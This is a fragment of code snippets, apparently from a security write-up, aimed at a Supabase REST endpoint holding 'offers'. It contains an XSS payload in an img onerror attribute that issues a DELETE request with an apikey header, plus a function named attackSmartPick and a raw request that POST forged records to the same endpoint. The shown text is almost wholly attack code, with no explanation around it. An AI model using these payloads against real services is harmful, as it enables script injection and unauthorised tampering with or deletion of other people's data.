...
fetch('https://ggzhtpaxnhwcilomswtm.supabase.co/rest/v1/offers', {
  method: 'POST',
  headers: {
...
```html
<img src="x" onerror="
  fetch('https://ggzhtpaxnhwcilomswtm.supabase.co/rest/v1/offers?id=eq.[offer-id]', {
    method: 'DELETE',
    headers: {
      'apikey': '[public-key]',
...
async function attackSmartPick() {
  ...
  const response = await fetch('https://ggzhtpaxnhwcilomswtm.supabase.co/rest/v1/offers', {
    method: 'POST',
